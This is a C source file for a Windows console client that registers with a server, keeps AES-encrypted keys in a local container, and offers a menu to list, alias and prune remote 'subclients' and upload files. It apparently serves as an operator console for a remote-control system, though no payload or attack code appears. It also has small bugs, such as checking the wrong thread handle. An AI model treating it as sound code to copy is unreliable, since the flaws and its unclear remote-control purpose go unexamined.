/* 
twitter: @oxfemale
emails: root@eas7.ru or root@kitsune.online
telegram: https://t.me/BelousovaAlisa
*/
#include "stdafx.h"
#include "globalvars.h"
#include "cryptone_web.h"
#include "PacketFactory.h"
#include "SystemInfo.h"
#include "Container.h"
#include "AskPasswords.h"
#include "AskUsername.h"
#include "http.h"
#include "Randoms.h"
#include "UserRegistration.h"
#include "AddNewClient.h"
#include "ClientFunctions.h"
#include "ReadCfgFiles.h"
#include "KeysExchange.h"
#include "console.h"
#pragma comment (lib, "Wininet.lib")

int SetMenu()
{
    ConsoleOutput(__FILE__, __FUNCTION__, __LINE__, "Begin.", 3);

    char iSelect[2] = {0};
    char* cLongLine = "                                          ";

    for (;;)
    {
        gotoxy(35, 35);
        clear_screen(0, 0);
        printf("[Default server is %s ]",gServername);
        gotoxy(0, 1);
        miniLogo();
        printf("Menu for user [%s]:\r\n", gUsername);
        printf("0 - Online subclients list. \t1 - Get all subclients list. \t2 - Set client alias.\r\n");
        printf("3 - Delete old offline subclients.\r\n");
        printf("4 - Upload File.\r\n");
        printf("q - Exit from program.\r\n");
        iSelect[0] = _getch();
        
        if (iSelect[0] == '3')
        {
            printf("%c\r\n", iSelect[0]);
            DeleteOldSubclients();
            printf("press any key to continue... %s", cLongLine);
            _getch();
            continue;
        }

        if (iSelect[0] == '0')
        {
            printf("%c\r\n", iSelect[0]);
            GetSubclientsListOnline();
            printf("press any key to continue... %s", cLongLine);
            _getch();
            continue;
        }
        if (iSelect[0] == '1')
        {
            printf("%c\r\n", iSelect[0]);
            GetSubclientsList();
            printf("press any key to continue... %s", cLongLine);
            _getch();
            continue;
        }
        if (iSelect[0] == '2')
        {
            printf("%c\r\n", iSelect[0]);
            SetSubclientsAlias();
            printf("press any key to continue... %s", cLongLine);
            _getch();
            continue;
        }
                
        if ( iSelect[0] == 3 )
        {
            printf("\r\nCancel and exit.\r\n");
            fclose(gLogFile);
            return 0;
        }
        if (iSelect[0] == 26)
        {
            printf("\r\nCancel and exit.\r\n");
            return 0;
        }
        if (iSelect[0] == 13)
        {
            printf("\r\nCancel and exit.\r\n");
            fclose(gLogFile);
            return 0;
        }
        if (iSelect[0] == 'q')
        {
            printf("%c\r\n", iSelect[0]);
            printf("\r\nExit.\r\n");
            fclose(gLogFile);
            return 0;
        }

        printf("\r\n");
}
return 0;
}


int _tmain(int argc, _TCHAR* argv[])
{
	char* cryptone = "cryptone.dll";
	hModuleCRYPT = NULL;
	unsigned char* strPwd = NULL;
	FILE* pFile = NULL;
    char* Servername = NULL;
    gAESkey = NULL;
    gAESVector = NULL;
    gUseridhash = NULL;
    gUsername = NULL;
    gServerPassword = NULL;

	gLogFile = fopen("logfile.txt", "ab");
	
	
    clear_screen(0,0);
    ConsoleOutput(__FILE__, __FUNCTION__, __LINE__, "Start client.", 0);
    gotoxy(0,2);
    LogoPrint();

    hModuleCRYPT = LoadLibraryA(cryptone);
    if (hModuleCRYPT == NULL)
    {
        printf("Error[%d] load [%s] dll\r\n", GetLastError(), cryptone);
		ConsoleOutput(__FILE__,__FUNCTION__, __LINE__, "Load library cryptone.dll error.", 1);
        return 0;
    }

    if (SetDefaultAESVector() == 0)
    {
		ConsoleOutput(__FILE__,__FUNCTION__, __LINE__, "Error set default aes vector.", 1);
        return 0;
    }

    if (ServersList() == 0)
    {
		ConsoleOutput(__FILE__,__FUNCTION__, __LINE__, "Error set default servername.", 1);
        return 0;
    }
    Servername = gServername;

    if( doPingServer(Servername) == 1 )
	{
		ConsoleOutput(__FILE__,__FUNCTION__, __LINE__, "Server is Alive.", 0);
		bestType = SelectBestHttpTraffic(Servername);
	}else
	{
		printf("Server is Down.\r\n");
		ConsoleOutput(__FILE__,__FUNCTION__, __LINE__, "Server is Down.", 1);
		return 0;
	}


	pFile = fopen("file.cfg", "rb");
	if(pFile != NULL)
	{
		fclose(pFile);
		FILE* pasFile = NULL;
		pasFile = fopen("pass.cfg", "rb");
		if(pasFile == NULL)
		{
			strPwd = (unsigned char*)AskContainerPassword( NULL );
            if (strPwd == NULL)
            {
                fclose(gLogFile);
                return 0;
            }
		}else{
			strPwd =  (unsigned char*)VirtualAlloc( NULL, 32, MEM_COMMIT, PAGE_READWRITE );
			if( strPwd == NULL )
			{
				fclose(pFile);
				fclose(pasFile);
				ConsoleOutput(__FILE__,__FUNCTION__, __LINE__, "Error VirtualAlloc for password buffer.", 1);
                fclose(gLogFile);
				return 0;
			}
			memset( strPwd, '-', 32 );
			fread( strPwd, 1, 32, pasFile);
			fclose(pasFile);
		}

		if( IsContainer() == 1 )
		{
			if( TestCfgVars( strPwd ) == 0 )
			{
				ConsoleOutput(__FILE__,__FUNCTION__, __LINE__, "Error test Container vars. Container keys is deleted, please, goto login/register again.", 1);
				remove( "file.cfg" );
                fclose(gLogFile);
				return 0;
			}
		
			if ( isRegUser( strPwd ) == 0 )
			{
				remove( "file.cfg" );
				ConsoleOutput(__FILE__,__FUNCTION__, __LINE__, "Not reggged user. Container keys is deleted, please, goto login/register again.", 1);
                fclose(gLogFile);
				return 0;
			}else{
				ConsoleOutput(__FILE__,__FUNCTION__, __LINE__, "Found reggged user.", 0);
                
                SetKeysMem(strPwd);
                ClientPingServer();

				HANDLE hPingThread = CreateThread(0, 0, &MainThreadPing, 0, 0, 0);
                if (hPingThread == NULL)
                {
                    printf("Error Start ping server.\r\n");
					ConsoleOutput(__FILE__,__FUNCTION__, __LINE__, "Start thread ping server error.", 1);
                    fclose(gLogFile);
                    return 0;
                }
                CloseHandle(hPingThread);
                
                HANDLE hKeysThread = CreateThread(0, 0, &MainThreadKeysExchange, strPwd, 0, 0);
                if (hPingThread == NULL)
                {
					ConsoleOutput(__FILE__,__FUNCTION__, __LINE__, "Start Client/Server Keys Exchange thread error.", 1);
                    fclose(gLogFile);
                    return 0;
                }
                CloseHandle(hKeysThread);

                SetMenu();
                fclose(gLogFile);
				return 1;
			}
		}else{
			ConsoleOutput(__FILE__,__FUNCTION__, __LINE__, "Container password is wrong or container file is bad.", 1);
			ConsoleOutput(__FILE__,__FUNCTION__, __LINE__, "Delete file.cfg if not remebers container password.", 1);
            fclose(gLogFile);
			return 0;
		}
	}else
	{
		if ( NewUserRegistration( Servername ) == 0 )
		{
			ConsoleOutput(__FILE__,__FUNCTION__, __LINE__, "Registration error.", 1);
            remove("file.cfg");
            fclose(gLogFile);
			return 0;
		}else
		{
			ConsoleOutput(__FILE__,__FUNCTION__, __LINE__, "Registration Ok, cfg file container crypted.", 0);
            strPwd = (unsigned char*)AskContainerPassword("Please, enter container password again ");
            if (strPwd == NULL)
            {
                ConsoleOutput(__FILE__, __FUNCTION__, __LINE__, "Container password is NULL.", 1);
                fclose(gLogFile);
                return 0;
            }
            
            SetKeysMem(strPwd);
            ClientPingServer();

            HANDLE hPingThread = CreateThread(0, 0, &MainThreadPing, 0, 0, 0);
            if (hPingThread == NULL)
            {
				ConsoleOutput(__FILE__,__FUNCTION__, __LINE__, "Start thread ping server error.", 1);
                fclose(gLogFile);
                return 0;
            }
            CloseHandle(hPingThread);

            HANDLE hKeysThread = CreateThread(0, 0, &MainThreadKeysExchange, strPwd, 0, 0);
            if (hPingThread == NULL)
            {
				ConsoleOutput(__FILE__,__FUNCTION__, __LINE__, "Start Client/Server Keys Exchange thread error.", 1);
                fclose(gLogFile);
                return 0;
            }
            CloseHandle(hKeysThread);

            SetMenu();
            fclose(gLogFile);
			return 1;
		}
		VirtualFree( strPwd, 0, MEM_RELEASE );
	}

    fclose(gLogFile);
	return 0;
}


